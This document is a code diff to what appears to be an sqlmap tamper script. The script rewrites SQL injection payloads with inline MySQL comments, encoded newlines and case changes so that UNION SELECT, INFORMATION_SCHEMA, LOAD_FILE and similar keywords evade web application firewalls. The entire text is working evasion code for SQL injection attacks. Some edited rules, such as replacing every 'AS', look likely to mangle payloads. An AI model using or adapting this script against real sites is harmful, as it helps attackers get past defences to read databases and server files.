@@ -8,7 +8,7 @@ import random
 import os
 from lib.core.enums import PRIORITY
 from lib.core.settings import UNICODE_ENCODING
-__priority__ = PRIORITY.HIGHEST
+__priority__ = PRIORITY.LOW
 from lib.core.common import singleTimeWarnMessage
 from lib.core.data import kb
 from lib.core.enums import DBMS
@@ -40,7 +40,7 @@ def tamper(payload, **kwargs):
         payload = payload.replace('CURRENT_USER(','CURRENT_USER/*//--//*/(')
         payload = payload.replace('SYSTEM_USER(','SYSTEM_USER/*//--//*/(')
         payload = payload.replace('SESSION_USER(','SESSION_USER/*//--//*/(')
-        payload = payload.replace('USER(','USER/*//--//*/(')
+        payload = payload.replace('USER(','UsEr/*//--//*/(')
         payload = payload.replace('LOAD_FILE(','LOAD_FILE/*//--//*/(')
         payload = payload.replace("SLEEP","/*%0aSLEEP*/")
         payload = payload.replace("LIKE", "/*!%0alike*/")
@@ -56,8 +56,7 @@ def tamper(payload, **kwargs):
         payload = payload.replace("CHR(", "CHR--%0a(")
         payload = payload.replace("WNER", "WNER--%0a")
         payload = payload.replace('super_priv','/*!29440/**/super_priv*/')
-        payload = payload.replace(" ", "/*/****/", 1)
-        payload = payload.replace("1", "/*!4444*/",1)
+        payload = payload.replace(" ", "/*!*/")
         payload = payload.replace("ORDER BY", "REGEXP \"[...%25%23]\"   /*!11444order %0a by*/")
         payload = payload.replace("union ALL SELECT", "/*!11444union all%0a select*/")
         payload = payload.replace(" AND", "/*!11444AND*/")
@@ -65,8 +64,8 @@ def tamper(payload, **kwargs):
         payload = payload.replace("UNION SELECT","/*!11444union*/  /*REGEXP \"[...%25%23]\"*/  %0a select /*REGEXP \"[...%25%23]\"*/")
         payload = payload.replace("UNION ALL SELECT", "REGEXP \"[...%0a%23]\" /*!11444union %0a select */ ")
         payload = payload.replace("()", "(%0a /*!80000aaa*/)")
-        payload = payload.replace(" AS", "/*!11444AS*/")
+        payload = payload.replace("AS", "/*!11444AS*/")
         payload = payload.replace("FROM", "/*!11444FROM*/")
-        payload = payload.replace("INFORMATION_SCHEMA", "/*like\"%0a%23\"*/ %0a  INFORMATION_SCHEMA")
+        payload = payload.replace('INFORMATION_SCHEMA','--+/*%0aINFORMATION_SCHEMA--+*/%0a')
 
     return payload
